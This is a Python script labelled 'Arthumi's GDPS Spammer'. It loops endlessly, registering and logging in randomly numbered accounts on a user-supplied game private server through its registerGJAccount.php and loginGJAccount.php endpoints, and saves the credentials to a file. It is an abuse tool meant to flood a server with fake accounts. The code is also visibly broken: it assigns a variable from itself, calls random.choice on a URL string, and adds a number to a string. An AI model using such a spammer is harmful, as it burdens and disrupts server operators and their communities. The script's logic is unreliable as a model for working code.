from urllib.request import urlopen
from threading import Thread
import time
import requests
import random
import base64

def main():
    database = database
    username = username
    database = random.choice(database)
    num = random.randint(100000, 100000000)
    response = print(
        requests.post(
          f'{database}accounts/registerGJAccount.php',
            data={
              'userName': str(num) + f'{username}',
                'password': str(num),
                'email': str(num) + f'{username}'
            }).status_code)
    response = print(
        requests.post(
          f'{database}accounts/loginGJAccount.php',
            data={
              'userName': str(num) + f'{username}',
                'password': str(num),
            }).status_code)
    f = open("accounts.txt", "a")
    f.write(f"{username}{num}:{num}\n")
    f.close()
    print("username number + pass" + num)

print("Arthumi's GDPS Spammer")
database = input("database url:")
username = input("custom username before the number:")
while True:
    main()
